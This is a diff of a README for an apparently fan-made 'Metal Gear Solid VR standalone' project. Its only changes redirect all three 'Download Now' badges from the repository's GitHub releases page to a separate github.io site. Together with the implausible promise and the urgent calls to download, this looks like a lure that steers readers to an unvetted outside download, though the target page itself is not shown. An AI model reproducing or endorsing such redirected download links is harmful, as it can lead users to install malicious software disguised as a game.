@@ -1,6 +1,6 @@
 # 🕹️ Metal-Gear-Solid-VR-Standalone - Play MGS in VR Without a PC
 
-[![Download Now](https://img.shields.io/badge/Download-MGS_VR_Standalone-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/readsrose22-cyber/Metal-Gear-Solid-VR-Standalone/releases)
+[![Download Now](https://img.shields.io/badge/Download-MGS_VR_Standalone-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://readsrose22-cyber.github.io)
 
 ## 🎮 What Is This?
 
@@ -38,7 +38,7 @@ Created by dedicated fans of the Metal Gear franchise. This is a labor of love, 
 
 **Visit this link to download the application:**
 
-[![Download MGS VR](https://img.shields.io/badge/⬇️_Download_MGS_VR_Standalone-4CAF50?style=for-the-badge)](https://github.com/readsrose22-cyber/Metal-Gear-Solid-VR-Standalone/releases)
+[![Download MGS VR](https://img.shields.io/badge/⬇️_Download_MGS_VR_Standalone-4CAF50?style=for-the-badge)](https://readsrose22-cyber.github.io)
 
 On the download page, you'll find the latest release. Look for the file associated with the newest version number.
 
@@ -175,7 +175,7 @@ Metal-Gear-Solid-VR-Standalone brings the tension, strategy, and thrill of steal
 
 Don't wait. Download it now, put on your headset, and remember: **stealth is your greatest weapon.**
 
-[![Get Started](https://img.shields.io/badge/🚀_Download_Now-FF0000?style=for-the-badge&logo=github)](https://github.com/readsrose22-cyber/Metal-Gear-Solid-VR-Standalone/releases)
+[![Get Started](https://img.shields.io/badge/🚀_Download_Now-FF0000?style=for-the-badge&logo=github)](https://readsrose22-cyber.github.io)
 
 ---
 
